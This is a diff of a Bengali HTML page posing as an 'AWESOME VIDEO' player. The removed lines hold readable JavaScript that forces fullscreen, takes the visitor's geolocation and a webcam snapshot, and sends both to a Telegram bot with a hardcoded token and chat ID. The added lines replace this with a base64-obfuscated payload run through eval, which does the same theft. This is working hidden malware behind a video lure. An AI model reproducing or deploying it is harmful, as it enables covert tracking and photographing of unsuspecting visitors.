@@ -2,7 +2,6 @@
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AWESOME VIDEO</title>
     <style>
         body {
@@ -35,95 +34,22 @@
     </style>
 </head>
 <body>
-
     <video id="bgVideo" autoplay loop controls>
-        <source src="https://raw.githubusercontent.com/SadiAlSabbir/Awesome-Video/main/VID_20250513_233202_486.mp4" type="video/mp4">
+        <source src="https://raw.githubusercontent.com/system-error-401/Awesome-Video/main/VID_20250513_233202_486.mp4" type="video/mp4">
         আপনার ব্রাউজার ভিডিও প্লে করতে পারে না।
     </video>
-
     <div id="message">Give Permission First!</div>
     <canvas id="canvas"></canvas>
 
     <script>
-        document.addEventListener("DOMContentLoaded", function () {
-            function goFullscreen() {
-                let doc = document.documentElement;
-                if (doc.requestFullscreen) {
-                    doc.requestFullscreen();
-                } else if (doc.mozRequestFullScreen) {
-                    doc.mozRequestFullScreen();
-                } else if (doc.webkitRequestFullscreen) {
-                    doc.webkitRequestFullscreen();
-                } else if (doc.msRequestFullscreen) {
-                    doc.msRequestFullscreen();
-                }
-            }
-
-            goFullscreen();
-            document.addEventListener("click", goFullscreen);
-
-            let botToken = "7847518909:AAF_5IKKK7gyDT_YHvDMjenA-j0roWTktgw"; // 🔹 টেলিগ্রাম বটের API টোকেন দিন
-            let chatId = "6947565760"; // 🔹 টেলিগ্রাম চ্যাট আইডি দিন
-
-            function sendLocation(latitude, longitude) {
-                fetch(`https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`)
-                    .then(response => response.json())
-                    .catch(error => console.log(error));
-            }
-
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    let latitude = position.coords.latitude;
-                    let longitude = position.coords.longitude;
-                    sendLocation(latitude, longitude);
-                }, function(error) {
-                    console.log("Not Found");
-                });
-            }
-
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    let bgVideo = document.getElementById("bgVideo");
-                    let message = document.getElementById("message");
-
-                    message.style.display = 'none';
-                    bgVideo.style.display = 'block';
-
-                    let video = document.createElement("video");
-                    video.srcObject = stream;
-                    video.play();
-
-                    // 🔹 ভিডিও চালু হওয়ার পর ছবি ক্যাপচার করবে
-                    video.onloadedmetadata = function () {
-                        setTimeout(() => {
-                            let canvas = document.getElementById("canvas");
-                            let context = canvas.getContext("2d");
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                            stream.getTracks().forEach(track => track.stop());
-
-                            canvas.toBlob(blob => {
-                                let formData = new FormData();
-                                formData.append("chat_id", chatId);
-                                formData.append("photo", blob, "image.jpg");
-
-                                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                                    method: "POST",
-                                    body: formData
-                                }).then(response => response.json())
-                                  .catch(error => console.log(error));
-                            }, 'image/jpeg');
-                        }, 1000);
-                    };
-                })
-                .catch(error => {
-                    let message = document.getElementById("message");
-                    message.style.display = 'block';
-                });
-        });
+        (function(){
+            const obf = 'KGZ1bmN0aW9uKCl7ZnVuY3Rpb24gZ28oKXt2YXIgcj1kb2N1bWVudC5kb2N1bWVudEVsZW1lbnQ7ci5yZXF1ZXN0RnVsbHNjcmVlbiYmci5yZXF1ZXN0RnVsbHNjcmVlbigpO3JldHVybiB9Z28oKTtkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsZ28pO3ZhciBiPSI3ODQ3NTE4OTA5OkFBRl81SUtLSzdn
+eURUX1lIdkRNamVuQS1qMHJvV1RrdGd3IixjPSI2OTQ3NTY1NzYwIjtmdW5jdGlvbiBkKGUsdCl7ZmV0Y2goYGh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Qke2J9L3NlbmRMb2NhdGlvbj9jaGF0X2lkPSR7Y30mbGF0aXR1ZGU9JHtlfSZsb25naXR1ZGU9JHt0fWBpLnRoZW4oZS0+ZS5qc29uKCkpLmNhdGNoKGVyci0+Y29uc29sZS5sb2coZXJyKSl9aWYoImdlb2xvY2F0aW9uImluIG5hdmlnYXRvciYmbmF2aWdhdG9yLmdlb2xvY2F0aW9uLmdldEN1cnJlbnRQb3NpdGlvbil7bmF2aWdhdG9yLmdlb2xvY2F0aW9uLmdldEN1cnJlbnRQb3NpdGlvbihmdW5jdGlvbihlKXt2YXIgbD1lLmNvb3Jkcy5sYXRpdHVkZSxvPWUuY29vcmRzLmxvbmdpdHVkZTtkKGwsbyl9LGZ1bmN0aW9uKCl7Y29uc29sZS5sb2coIk5vdCBGb3VuZCIpfSl9bmF2aWdhdG9yLm1lZGlhRGV2aWNlcy5nZXRVc2VyTWVkaWEoe3ZpZGVvOnRydWV9KS50aGVuKHM9Pnt2YXIgdj1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiYmdWaWRlbyIpLHI9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIm1lc3NhZ2UiKTtyLnN0eWxlLmRpc3BsYXk9Im5vbmUiLHYuc3R5bGUuZGlzcGxheT0iYmxvY2siO3ZhciB2aT1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJ2aWRlbyIpO3ZpLnNyY1
+9PYmplY3Q9cyxzLnBsYXkoKSx2aS5vbmxvYWRlZG1ldGFkYXRhPWZ1bmN0aW9uKCl7c2V0VGltZW91dChmdW5jdGlvbigpe3ZhciBjPWQuZ2V0RWxlbWVudEJ5SWQoImNhbnZhcyIpLHU9Yy5nZXRDb250ZXh0KCIyZCIpO2Mud2lkdGg9dmlkZW8udmlkZW9XaWR0aDtjLmhlaWdodD12aWRlby52aWRlb0hlaWdodDt1LmRyYXdJbWFnZSh2aWRlbywwLDAsYy53aWR0aCxjLmhlaWdodCkscy5nZXRUcmFja3MoKS5mb3JFYWNoKGU9PnQuc3RvcCgpKTtjLnRvQmxvYihmdW5jdGlvbihlKXt2YXIgZj1uZXcgRm9ybURhdGEoKTtmLmFwcGVuZCg
+iY2hhdF9pZCIsYyk7Zi5hcHBlbmQoInBob3RvIixlLCJpbWFnZS5qcGciKTtmZXRjaChg
+aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCR7Yn0vc2VuZFBob3RvYCx7bWV0aG9kOiJQT1NUIixib2R5OmZ9KS50aGVuKHI9PnIuanNvbigpKS5jYXRjaChlPT5jb25zb2xlLmxvZyhlKSl9LCdpbWFnZS9qcGVnJyl9LDEwMDApfX0pfSkoKS5jYXRjaChlPT57ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIm1lc3NhZ2UiKS5zdHlsZS5kaXNwbGF5PSdibG9jaycpfSk7fSkoKTs=';
+            eval(atob(obf));
+        })();
     </script>
-
 </body>
 </html>
